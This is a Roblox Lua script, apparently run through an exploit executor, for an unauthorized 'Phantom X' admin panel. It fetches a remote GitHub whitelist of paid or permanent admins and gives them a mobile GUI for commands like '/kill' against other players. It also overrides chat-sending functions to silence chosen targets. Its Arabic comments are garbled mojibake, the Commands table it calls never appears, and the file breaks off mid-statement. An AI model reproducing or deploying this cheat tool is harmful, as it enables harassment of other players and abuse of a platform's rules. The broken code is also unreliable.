-- ===== ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ£ÿØŸÖŸÜ ÿßŸÑŸÉÿßŸÖŸÑ ÿßŸÑŸÖÿπÿØŸÑ ŸÖÿπ GUI ŸÑŸÑŸÖŸàÿ®ÿßŸäŸÑ =====
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local Debris = game:GetService("Debris")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local ADMINS_JSON_URL = "https://raw.githubusercontent.com/AlphaBay00/Admin.json/main/admins%20(1).json"
local MAX_MESSAGES = 250
local ALLOW_PARTIAL_MATCH = true
local SCREAM_IMAGE_ID = "rbxassetid://12723744729"

local RESTRICTED_PLACE_IDS = {11379739543, 98752102030179}

local funConn = nil
local originalWalkSpeed = 16
local speedConnections = {}
local cuffsConnections = {}
local cuffsEffects = {}

local jails = {}
local JAIL_SETTINGS = {
    WALL_SIZE = 6, WALL_HEIGHT = 8, WALL_THICKNESS = 0.5,
    FLOOR_OFFSET = 4, POSTS_COLOR = Color3.fromRGB(200, 0, 0), POSTS_SPACING = 1
}

-- ===== ŸÜÿ∏ÿßŸÖ ŸÖŸÜÿπ ÿßŸÑÿ¥ÿßÿ™ ÿßŸÑŸÖÿπÿØŸÑ =====
local chatBlockers = {}
local originalChatFunctions = {}

local function blockPlayerChat(targetPlayer)
    if not targetPlayer or targetPlayer == LocalPlayer then return end
    
    if chatBlockers[targetPlayer] then return end
    
    chatBlockers[targetPlayer] = {}
    originalChatFunctions[targetPlayer] = {}
    
    task.spawn(function()
        local success, targetGui = pcall(function()
            return targetPlayer:WaitForChild("PlayerGui", 5)
        end)
        
        if success and targetGui then
            local chatElements = {"Chat", "ChatBar", "ChatMain", "ChatChannelParent", "ChatWindow"}
            for _, elementName in pairs(chatElements) do
                local element = targetGui:FindFirstChild(elementName)
                if element then
                    pcall(function() element:Destroy() end)
                end
            end
        end
    end)
    
    task.spawn(function()
        pcall(function()
            local defaultChat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if defaultChat then
                local sayMessage = defaultChat:FindFirstChild("SayMessageRequest")
                if sayMessage then
                    originalChatFunctions[targetPlayer].SayMessageRequest = sayMessage.FireServer
                    sayMessage.FireServer = function(...)
                        return nil
                    end
                end
            end
        end)
    end)
    
    task.spawn(function()
        pcall(function()
            if TextChatService then
                if TextChatService.TextChannels then
                    for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
                        if channel:IsA("TextChannel") then
                            originalChatFunctions[targetPlayer][channel.Name] = channel.SendAsync
                            channel.SendAsync = function(self, ...)
                                return nil
                            end
                        end
                    end
                end
                
                local chatWindow = TextChatService:FindFirstChild("ChatWindow")
                if chatWindow then
                    chatWindow.Enabled = false
                end
            end
        end)
    end)
    
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    end)
end

local function unblockPlayerChat(targetPlayer)
    if not targetPlayer or not chatBlockers[targetPlayer] then return end
    
    chatBlockers[targetPlayer] = nil
    
    if originalChatFunctions[targetPlayer] then
        pcall(function()
            local defaultChat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if defaultChat and originalChatFunctions[targetPlayer].SayMessageRequest then
                local sayMessage = defaultChat:FindFirstChild("SayMessageRequest")
                if sayMessage then
                    sayMessage.FireServer = originalChatFunctions[targetPlayer].SayMessageRequest
                end
            end
            
            if TextChatService and TextChatService.TextChannels then
                for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
                    if channel:IsA("TextChannel") and originalChatFunctions[targetPlayer][channel.Name] then
                        channel.SendAsync = originalChatFunctions[targetPlayer][channel.Name]
                    end
                end
            end
            
            local chatWindow = TextChatService:FindFirstChild("ChatWindow")
            if chatWindow then
                chatWindow.Enabled = true
            end
        end)
    end
    
    originalChatFunctions[targetPlayer] = nil
    
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    end)
end

-- ===== ÿØÿßŸÑÿ© ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿßŸÑÿµŸÑÿßÿ≠Ÿäÿ© ŸÅŸÇÿ∑ =====
local function checkMyAdminStatus()
    local success, adminData = pcall(function()
        local response = game:HttpGet(ADMINS_JSON_URL .. "?t=" .. os.time())
        return HttpService:JSONDecode(response)
    end)
    
    if not success or not adminData then
        return
    end
    
    local myName = LocalPlayer.Name
    for username, expiryDate in pairs(adminData) do
        if tostring(username):lower() == myName:lower() then
            if expiryDate:lower() == "permanent" then
                return
            end
            
            local year, month, day = expiryDate:match("(%d+)-(%d+)-(%d+)")
            if not year then return end
            
            local expiryTime = os.time({
                year = tonumber(year), 
                month = tonumber(month), 
                day = tonumber(day), 
                hour = 23, min = 59, sec = 59
            })
            local currentTime = os.time()
            local timeDiff = expiryTime - currentTime
            
            if timeDiff <= 0 then
                local daysAgo = math.floor(-timeDiff / 86400)
                print("‚ùå ÿµŸÑÿßÿ≠Ÿäÿ™ŸÉ ÿßŸÜÿ™Ÿáÿ™ ŸÖŸÜÿ∞ " .. daysAgo .. " ŸäŸàŸÖ")
            else
                local daysLeft = math.floor(timeDiff / 86400)
                local hoursLeft = math.floor((timeDiff % 86400) / 3600)
                print("‚è≥ ŸÖÿ™ÿ®ŸÇŸä " .. daysLeft .. " ŸäŸàŸÖ Ÿà " .. hoursLeft .. " ÿ≥ÿßÿπÿ©")
            end
            return
        end
    end
end

-- ===== ÿØÿßŸÑÿ© ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿßŸÑÿ£ÿ≥ÿßÿ≥Ÿäÿ© ŸÑŸÑÿ£ÿØŸÖŸÜ =====
local function checkExpiry(expiryDate)
    if not expiryDate or expiryDate == "" or expiryDate:lower() == "permanent" then 
        return true 
    end
    
    local success, result = pcall(function()
        local year, month, day = expiryDate:match("(%d+)-(%d+)-(%d+)")
        if not year then return false end
        
        local expiryTime = os.time({
            year = tonumber(year), 
            month = tonumber(month), 
            day = tonumber(day), 
            hour = 23, min = 59, sec = 59
        })
        return os.time() <= expiryTime
    end)
    
    return success and result or false
end

-- ===== ÿ¨ŸÑÿ® ÿßŸÑÿ£ÿØŸÖŸÜÿ≤ ŸÖÿπ ŸÖÿπÿ±ŸÅÿ© ŸÖŸÜ Ÿäÿ≠ÿ™ÿßÿ¨ GUI =====
local Admins = {}
local GuiUsers = {}
local function loadAdminsFromJSON()
    local success, result = pcall(function()
        local response = game:HttpGet(ADMINS_JSON_URL)
        if response then
            local adminData = HttpService:JSONDecode(response)
            if adminData and type(adminData) == "table" then
                local adminList = {}
                GuiUsers = {}
                
                for username, expiryData in pairs(adminData) do
                    if username and username ~= "" and expiryData and expiryData ~= "" then
                        local expiryDate, guiFlag = expiryData:match("^(.-)|?(.*)$")
                        
                        if expiryDate and checkExpiry(expiryDate) then 
                            table.insert(adminList, username) 
                            
                            if guiFlag:lower() == "gui" then
                                GuiUsers[username:lower()] = true
                            end
                        end
                    end
                end
                return adminList
            end
        end
        return {}
    end)
    
    if success then 
        Admins = result 
    else 
        Admins = {"Lol21536544"} 
    end
    return Admins
end

loadAdminsFromJSON()

-- ===== GUI ŸÑŸÑŸÖŸàÿ®ÿßŸäŸÑ (ŸÑŸÑŸä ŸÖÿß ÿπŸÜÿØŸáŸÖ ÿ¥ÿßÿ™) =====
local MobileGUI = nil
local function createMobileGUI()
    if MobileGUI and MobileGUI.Parent then
        MobileGUI:Destroy()
    end
    
    local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui") or game:GetService("CoreGui")
    
    if PlayerGui:FindFirstChild("PhantomX_GUI") then
        PlayerGui:FindFirstChild("PhantomX_GUI"):Destroy()
    end

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "PhantomX_GUI"
    ScreenGui.DisplayOrder = 999
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local OpenButton = Instance.new("ImageButton")
    OpenButton.Name = "OpenButton"
    OpenButton.Size = UDim2.new(0, 60, 0, 60)
    OpenButton.Position = UDim2.new(0, 15, 0, 15)
    OpenButton.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
    OpenButton.BackgroundTransparency = 0.2
    OpenButton.Image = "rbxassetid://121597503902726"
    OpenButton.ScaleType = Enum.ScaleType.Crop
    OpenButton.Visible = true

    local OpenCorner = Instance.new("UICorner")
    OpenCorner.CornerRadius = UDim.new(0, 12)
    OpenCorner.Parent = OpenButton

    local ImageContainer = Instance.new("Frame")
    ImageContainer.Name = "ImageContainer"
    ImageContainer.Size = UDim2.new(1, 0, 1, 0)
    ImageContainer.Position = UDim2.new(0, 0, 0, 0)
    ImageContainer.BackgroundTransparency = 1
    ImageContainer.ClipsDescendants = true

    local ImageCorner = Instance.new("UICorner")
    ImageCorner.CornerRadius = UDim.new(0, 12)
    ImageCorner.Parent = ImageContainer

    local OpenStroke = Instance.new("UIStroke")
    OpenStroke.Color = Color3.fromRGB(80, 150, 220)
    OpenStroke.Thickness = 1.5
    OpenStroke.Parent = OpenButton

    task.spawn(function()
        task.wait(0.5)
        
        if OpenButton.ImageTransparency == 1 then
            OpenButton.Image = ""
            OpenButton.BackgroundColor3 = Color3.fromRGB(60, 100, 180)
            
            local TextLabel = Instance.new("TextLabel")
            TextLabel.Size = UDim2.new(1, 0, 1, 0)
            TextLabel.BackgroundTransparency = 1
            TextLabel.Text = "üìù"
            TextLabel.TextColor3 = Color3.fromRGB(200, 230, 255)
            TextLabel.TextSize = 32
            TextLabel.Font = Enum.Font.GothamBold
            TextLabel.Parent = OpenButton
        else
            OpenButton.ScaleType = Enum.ScaleType.Crop
            OpenButton.ImageTransparency = 0.5
            for i = 0.5, 0, -0.1 do
                OpenButton.ImageTransparency = i
                task.wait(0.05)
            end
            OpenButton.ImageTransparency = 0
        end
    end)

    ImageContainer.Parent = OpenButton

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 300, 0, 260)
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 25, 40)
    MainFrame.BackgroundTransparency = 0.15
    MainFrame.BorderSizePixel = 0
    MainFrame.ClipsDescendants = true
    MainFrame.Visible = false

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 16)
    UICorner.Parent = MainFrame

    local MainStroke = Instance.new("UIStroke")
    MainStroke.Color = Color3.fromRGB(70, 110, 190)
    MainStroke.Thickness = 1.5
    MainStroke.Parent = MainFrame

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 0)
    Title.BackgroundColor3 = Color3.fromRGB(35, 45, 75)
    Title.BackgroundTransparency = 0.4
    Title.Text = "Phantom X"
    Title.TextColor3 = Color3.fromRGB(220, 240, 255)
    Title.TextSize = 20
    Title.Font = Enum.Font.GothamBold
    Title.TextStrokeTransparency = 0.8

    local TitleCorner = Instance.new("UICorner")
    TitleCorner.CornerRadius = UDim.new(0, 16)
    TitleCorner.Parent = Title

    local CloseButton = Instance.new("TextButton")
    CloseButton.Name = "CloseButton"
    CloseButton.Size = UDim2.new(0, 30, 0, 30)
    CloseButton.Position = UDim2.new(1, -35, 0, 5)
    CloseButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.TextSize = 18
    CloseButton.Font = Enum.Font.GothamBold

    local CloseCorner = Instance.new("UICorner")
    CloseCorner.CornerRadius = UDim.new(0, 8)
    CloseCorner.Parent = CloseButton

    local InputBox = Instance.new("TextBox")
    InputBox.Name = "InputBox"
    InputBox.Size = UDim2.new(1, -30, 0, 65)
    InputBox.Position = UDim2.new(0, 15, 0, 50)
    InputBox.BackgroundColor3 = Color3.fromRGB(30, 35, 55)
    InputBox.BackgroundTransparency = 0.4
    InputBox.TextColor3 = Color3.fromRGB(240, 240, 255)
    InputBox.TextSize = 14
    InputBox.Text = ""
    InputBox.PlaceholderText = "ÿßŸÉÿ™ÿ® ÿßŸÑÿ£ŸÖÿ± ŸáŸÜÿß ŸÖÿ´ŸÑ: /kill ali"
    InputBox.PlaceholderColor3 = Color3.fromRGB(140, 160, 200)
    InputBox.Font = Enum.Font.SourceSans
    InputBox.TextXAlignment = Enum.TextXAlignment.Right
    InputBox.TextYAlignment = Enum.TextYAlignment.Top
    InputBox.MultiLine = true
    InputBox.ClearTextOnFocus = false
    InputBox.TextWrapped = true

    local InputCorner = Instance.new("UICorner")
    InputCorner.CornerRadius = UDim.new(0, 10)
    InputCorner.Parent = InputBox

    local InputStroke = Instance.new("UIStroke")
    InputStroke.Color = Color3.fromRGB(90, 140, 230)
    InputStroke.Thickness = 1.2
    InputStroke.Parent = InputBox

    local DisplayBox = Instance.new("TextLabel")
    DisplayBox.Name = "DisplayBox"
    DisplayBox.Size = UDim2.new(1, -30, 0, 75)
    DisplayBox.Position = UDim2.new(0, 15, 0, 125)
    DisplayBox.BackgroundColor3 = Color3.fromRGB(25, 30, 50)
    DisplayBox.BackgroundTransparency = 0.4
    DisplayBox.TextColor3 = Color3.fromRGB(200, 255, 200)
    DisplayBox.TextSize = 13
    DisplayBox.Text = "ÿßŸÉÿ™ÿ® ÿßŸÑÿ£ŸÖÿ± Ÿàÿßÿ∂ÿ∫ÿ∑ ‚ö° ÿ™ŸÜŸÅŸäÿ∞"
    DisplayBox.Font = Enum.Font.SourceSans
    DisplayBox.TextXAlignment = Enum.TextXAlignment.Right
    DisplayBox.TextYAlignment = Enum.TextYAlignment.Top
    DisplayBox.TextWrapped = true

    local DisplayCorner = Instance.new("UICorner")
    DisplayCorner.CornerRadius = UDim.new(0, 10)
    DisplayCorner.Parent = DisplayBox

    local DisplayStroke = Instance.new("UIStroke")
    DisplayStroke.Color = Color3.fromRGB(70, 190, 110)
    DisplayStroke.Thickness = 1.2
    DisplayStroke.Parent = DisplayBox

    local ExecuteButton = Instance.new("TextButton")
    ExecuteButton.Name = "ExecuteButton"
    ExecuteButton.Size = UDim2.new(0.7, 0, 0, 35)
    ExecuteButton.Position = UDim2.new(0.15, 0, 0, 210)
    ExecuteButton.BackgroundColor3 = Color3.fromRGB(60, 110, 190)
    ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ExecuteButton.TextSize = 16
    ExecuteButton.Text = "‚ö° ÿ™ŸÜŸÅŸäÿ∞"
    ExecuteButton.Font = Enum.Font.GothamBold

    local ExecuteCorner = Instance.new("UICorner")
    ExecuteCorner.CornerRadius = UDim.new(0, 10)
    ExecuteCorner.Parent = ExecuteButton

    local ExecuteStroke = Instance.new("UIStroke")
    ExecuteStroke.Color = Color3.fromRGB(110, 170, 250)
    ExecuteStroke.Thickness = 1.5
    ExecuteStroke.Parent = ExecuteButton

    Title.Parent = MainFrame
    CloseButton.Parent = MainFrame
    InputBox.Parent = MainFrame
    DisplayBox.Parent = MainFrame
    ExecuteButton.Parent = MainFrame
    MainFrame.Parent = ScreenGui
    OpenButton.Parent = ScreenGui
    ScreenGui.Parent = PlayerGui

    local isOpen = false

    local function openGUI()
        OpenButton.Visible = false
        MainFrame.Size = UDim2.new(0, 0, 0, 0)
        MainFrame.BackgroundTransparency = 1
        MainFrame.Visible = true
        
        local expand = TweenService:Create(MainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 300, 0, 260),
            BackgroundTransparency = 0.15
        })
        expand:Play()
        isOpen = true
    end

    local function closeGUI()
        local shrink = TweenService:Create(MainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 0, 0, 0),
            BackgroundTransparency = 1
        })
        shrink:Play()
        shrink.Completed:Wait()
        MainFrame.Visible = false
        OpenButton.Visible = true
        isOpen = false
    end

    OpenButton.MouseButton1Click:Connect(openGUI)
    CloseButton.MouseButton1Click:Connect(closeGUI)

    -- ===== ÿ±ÿ®ÿ∑ GUI ÿ®ÿßŸÑÿ£ŸàÿßŸÖÿ± =====
    ExecuteButton.MouseButton1Click:Connect(function()
        ExecuteButton.BackgroundColor3 = Color3.fromRGB(80, 130, 210)
        task.wait(0.08)
        ExecuteButton.BackgroundColor3 = Color3.fromRGB(60, 110, 190)
        
        local text = InputBox.Text
        if text and text ~= "" then
            -- ŸÖÿπÿßŸÑÿ¨ÿ© ÿßŸÑÿ£ŸÖÿ± ŸÉŸÖÿß ŸÅŸä ÿßŸÑÿ¥ÿßÿ™
            local parts = {}
            for w in text:gmatch("%S+") do
                table.insert(parts, w)
            end
            
            local cmd = parts[1] and parts[1]:sub(1,1) == "/" and parts[1]:sub(2)
            local targ = parts[2]
            local extra = {}
            for i = 3, #parts do
                table.insert(extra, parts[i])
            end
            
            if cmd and Commands[cmd] then
                if targ then
                    pcall(function()
                        Commands[cmd](LocalPlayer.Name, targ, table.unpack(extra))
                    end)
                    DisplayBox.Text = "‚úÖ ÿ™ŸÖ ÿ™ŸÜŸÅŸäÿ∞: " .. text
                    DisplayBox.TextColor3 = Color3.fromRGB(100, 255, 100)
                else
                    DisplayBox.Text = "‚ö†Ô∏è ÿ™ÿ≠ÿ™ÿßÿ¨ ÿ™ÿ≠ÿØŸäÿØ ŸáÿØŸÅ"
                    DisplayBox.TextColor3 = Color3.fromRGB(255, 200, 100)
                end
            else
                DisplayBox.Text = "‚ö†Ô∏è ÿßŸÑÿ£ŸÖÿ± ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ: " .. (cmd or "nil")
                DisplayBox.TextColor3 = Color3.fromRGB(255, 200, 100)
            end
        else
            DisplayBox.Text = "‚ö†Ô∏è ÿßŸÉÿ™ÿ® ÿ£ŸÖÿ±ÿßŸã ÿ£ŸàŸÑÿßŸã!"
            DisplayBox.TextColor3 = Color3.fromRGB(255, 150, 150)
            task.wait(1.2)
            DisplayBox.TextColor3 = Color3.fromRGB(200, 255, 200)
            DisplayBox.Text = "ÿßŸÉÿ™ÿ® ÿßŸÑÿ£ŸÖÿ± Ÿàÿßÿ∂ÿ∫ÿ∑ ‚ö° ÿ™ŸÜŸÅŸäÿ∞"
        end
    end)

    local dragging = false
    local dragInput, dragStart, startPos

    local function updateInput(input)
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, 
                                       startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    Title.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    Title.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input == dragInput) then
            updateInput(input)
        end
    end)

    OpenButton.MouseEnter:Connect(function()
        TweenService:Create(OpenButton, TweenInfo.new(0.2), {BackgroundTransparency = 0.1}):Play()
    end)

    OpenButton.MouseLeave:Connect(function()
        TweenService:Create(OpenButton, TweenInfo.new(0.2), {BackgroundTransparency = 0.2}):Play()
    end)

    OpenButton.Visible = true
    MainFrame.Visible = false
    
    MobileGUI = ScreenGui
    return ScreenGui
end

-- ===== ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿ•ÿ∞ÿß ŸÉÿßŸÜ ÿßŸÑŸÑÿßÿπÿ® Ÿäÿ≠ÿ™ÿßÿ¨ GUI =====
local function checkIfNeedsGUI()
    local myName = LocalPlayer.Name:lower()
    if GuiUsers[myName] then
        task.wait(2)
        createMobileGUI()
        print("üì± ÿ™ŸÖ ÿ™ÿ≠ŸÖŸäŸÑ GUI ÿßŸÑŸÖŸàÿ®ÿßŸäŸÑ ŸÑŸÑÿßÿπÿ®: " .. LocalPlayer.Name)
    end
end

-- ===== ÿ•ÿπÿØÿßÿØ ÿßŸÑÿ¥ÿßÿ¥ÿ© =====
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AdminChatOverlay"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:FindFirstChild("PlayerGui") or game:GetService("CoreGui")

local frame = Instance.new("Frame", screenGui)
frame.Name = "BG"
frame.Size = UDim2.new(0.42,0,0.32,0)
frame.Position = UDim2.new(0.29,0,0.66,0)
frame.BackgroundColor3 = Color3.fromRGB(10,10,10)
frame.BackgroundTransparency = 0.25
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Visible = false

local scroll = Instance.new("ScrollingFrame", frame)
scroll.Name = "Messages"
scroll.Size = UDim2.new(1,-12,1,-40)
scroll.Position = UDim2.new(0,6,0,34)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.CanvasSize = UDim2.new(0,0,0,0)
scroll.ScrollBarThickness = 6
scroll.Visible = false

local uiList = Instance.new("UIListLayout", scroll)
uiList.SortOrder = Enum.SortOrder.LayoutOrder
uiList.Padding = UDim.new(0,4)

-- ===== ÿ•ÿØÿßÿ±ÿ© ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ =====
local messages = {}
local seenKeys = {}
local function addMessage(senderName, text)
    if persistent and persistent.nospeak then 
        return 
    end
    local key = tostring(senderName)..":"..tostring(text)
    if seenKeys[key] then 
        return 
    end
    seenKeys[key] = true

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1,-8,0,20)
    lbl.BackgroundTransparency = 1
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Font = Enum.Font.Code
    lbl.TextSize = 16
    lbl.TextColor3 = Color3.fromRGB(120,255,120)
    lbl.Text = "["..tostring(senderName).."]: "..tostring(text)
    lbl.Parent = scroll
    table.insert(messages, lbl)

    if #messages > MAX_MESSAGES then
        local old = table.remove(messages,1)
        if old and old.Parent then 
            old:Destroy() 
        end
    end

    RunService.Heartbeat:Wait()
    scroll.CanvasSize = UDim2.new(0,0,0,uiList.AbsoluteContentSize.Y)
    scroll.CanvasPosition = Vector2.new(0, math.max(0, scroll.CanvasSize.Y.Offset - scroll.AbsoluteSize.Y))
end

-- ===== ÿØŸàÿßŸÑ ŸÖÿ≥ÿßÿπÿØÿ© =====
local function trim(s) 
    return (s or ""):gsub("^%s*(.-)%s*$","%1") 
end

local function lower(s) 
    return (s or ""):lower() 
end

local function findPlayerByPartial(name)
    if not name or name == "" then 
        return nil 
    end
    
    local needle = lower(name)
    
    if needle == "me" then
        return LocalPlayer
    end
    
    if needle == "all" then
        return nil
    end
    
    for _, p in ipairs(Players:GetPlayers()) do
        if lower(p.Name) == needle then 
            return p 
        end
    end
    
    for _, p in ipairs(Players:GetPlayers()) do
        if ALLOW_PARTIAL_MATCH and string.find(lower(p.Name), needle, 1, true) then 
            return p 
        end
    end
    return nil
end

local function getHrp(player) 
    if not player or not player.Character then 
        return nil 
    end
    return player.Character:FindFirstChild("HumanoidRootPart") 
end

local function getHumanoid(player) 
    if not player or not player.Character then 
        return nil 
    end
    return player.Character:FindFirstChildOfClass("Humanoid") 
end

-- ===== ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿßŸÑÿ£ÿØŸÖŸÜ =====
local function isAdmin(playerName)
    local success, adminData = pcall(function()
        local response = game:HttpGet(ADMINS_JSON_URL)
        if response then 
            return HttpService:JSONDecode(response) 
        end
        return {}
    end)
    
    if success and adminData and type(adminData) == "table" then
        for username, expiryData in pairs(adminData) do
            if username and username ~= "" and expiryData and expiryData ~= "" then
                local expiryDate = expiryData:match("^(.-)|")
                if playerName:lower() == tostring(username):lower() then
                    if checkExpiry(expiryDate) then 
                        return true 
                    end
                end
            end
        end
    end
    
    return false
end

-- ===== ŸÜÿ∏ÿßŸÖ ÿ™ÿßÿ¨ OWNER ÿßŸÑÿ∞Ÿáÿ®Ÿä ÿßŸÑŸÑÿßŸÖÿπ =====
local function createOwnerAnimatedTag(player)
    if not player or not player.Character then return end
    
    local head = player.Character:WaitForChild("Head", 3)
    if not head then return end

    local old = head:FindFirstChild("OwnerBillboard")
    if old then old:Destroy() end

    local gui = Instance.new("BillboardGui")
    gui.Name = "OwnerBillboard"
    gui.Size = UDim2.new(0, 140, 0, 40)
    gui.StudsOffset = Vector3.new(0, 2.5, 0)
    gui.AlwaysOnTop = true
    gui.MaxDistance = 100
    gui.LightInfluence = 0.5
    gui.Adornee = head
    gui.Parent = game:GetService("CoreGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.fromScale(1,1)
    frame.BackgroundTransparency = 1
    frame.Parent = gui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.fromScale(1,1)
    label.BackgroundTransparency = 1
    label.Text = "OWNER"
    label.TextScaled = true
    label.RichText = false
    label.Font = Enum.Font.GothamBold
    label.TextColor3 = Color3.fromRGB(255,220,90)
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(65,40,10)
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.Parent = frame

    local shine = Instance.new("UIGradient")
    shine.Rotation = 18
    shine.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(170,120,20)),
        ColorSequenceKeypoint.new(0.35, Color3.fromRGB(255,220,90)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
        ColorSequenceKeypoint.new(0.65, Color3.fromRGB(255,220,90)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(170,120,20))
    }
    shine.Parent = label

    task.spawn(function()
        while gui.Parent do
            for offset = -1,1,0.03 do
                shine.Offset = Vector2.new(offset,0)
                task.wait(0.03)
            end
        end
    end)

    local floatOffset = 0
    local floatDir = 1
    task.spawn(function()
        while gui.Parent do
            floatOffset = floatOffset + 0.01 * floatDir
            if floatOffset > 0.15 then floatDir = -1 end
            if floatOffset < -0.15 then floatDir = 1 end

            local shakeX = math.sin(tick()*6)*0.02
            gui.StudsOffset = Vector3.new(shakeX, 2.5 + floatOffset, 0)
            task.wait(0.03)
        end
    end)
    
    return gui
end

local function createAdminTag(player, character)
    if player == LocalPlayer then 
        return 
    end
    
    local head = character:WaitForChild("Head", 5)
    if not head then 
        return 
    end

    local old = head:FindFirstChild("AdminTag")
    if old then 
        old:Destroy() 
    end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "AdminTag"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 120, 0, 30)
    billboard.StudsOffset = Vector3.new(0, 2.6, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = game:GetService("CoreGui")

    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1, 0, 1, 0)
    text.BackgroundTransparency = 1
    text.Font = Enum.Font.GothamSemibold
    text.TextScaled = true
    text.TextStrokeTransparency = 0
    text.Text = "Admin"
    text.TextColor3 = Color3.fromRGB(255, 255, 255)
    text.TextStrokeColor3 = Color3.fromRGB(200, 0, 0)
    text.Parent = billboard
    
    return billboard
end

local function removeAdminTag(player)
    if player.Character then
        local head = player.Character:FindFirstChild("Head")
        if head then
            local tag = head:FindFirstChild("AdminTag") or head:FindFirstChild("OwnerBillboard")
            if tag then 
                tag:Destroy() 
            end
        end
    end
end

-- ===== ÿØÿßŸÑÿ© ŸÑŸÑÿ®ÿ≠ÿ´ ÿπŸÜ Lol21536544 ŸàŸàÿ∂ÿπ ÿ™ÿßÿ¨ OWNER ÿπŸÑŸäŸá =====
local function findAndTagLol21536544()
    local lolPlayer = Players:FindFirstChild("Lol21536544")
    if lolPlayer then
        if lolPlayer == LocalPlayer then
            return
        end
        
        if lolPlayer.Character then
            createOwnerAnimatedTag(lolPlayer)
        end
        
        lolPlayer.CharacterAdded:Connect(function(character)
            task.wait(0.5)
            createOwnerAnimatedTag(lolPlayer)
        end)
        
        lolPlayer.CharacterRemoving:Connect(function()
            removeAdminTag(lolPlayer)
        end)
        
        return true
    end
    return false
end

-- ===== ÿ•ÿπÿØÿßÿØ ÿßŸÑŸÑÿßÿπÿ®ŸäŸÜ =====
local function setupPlayer(player)
    if isAdmin(player.Name) then
        if player.Name:lower() == "lol21536544" and player ~= LocalPlayer then
            if player.Character then
                createOwnerAnimatedTag(player)
            end
            
            local characterConnection
            characterConnection = player.CharacterAdded:Connect(function(character)
                if characterConnection then 
                    characterConnection:Disconnect() 
                end
                task.wait(0.5)
                createOwnerAnimatedTag(player)
                setupPlayer(player)
            end)
        elseif player ~= LocalPlayer then
            if player.Character then
                createAdminTag(player, player.Character)
            end
            
            local characterConnection
            characterConnection = player.CharacterAdded:Connect(function(character)
                if characterConnection then 
                    characterConnection:Disconnect() 
                end
                task.wait(0.5)
                createAdminTag(player, character)
                setupPlayer(player)
            end)
        end
        
        player.CharacterRemoving:Connect(function() 
            removeAdminTag(player) 
        end)
    end
end

task.spawn(function()
    task.wait(2)
    
    local found = findAndTagLol21536544()
    if not found then
        while true do
            task.wait(5)
            found = findAndTagLol21536544()
            if found then
                break
            end
        end
    end
end)

for _, player in ipairs(Players:GetPlayers()) do 
    if player.Name:lower() ~= "lol21536544" or player == LocalPlayer then
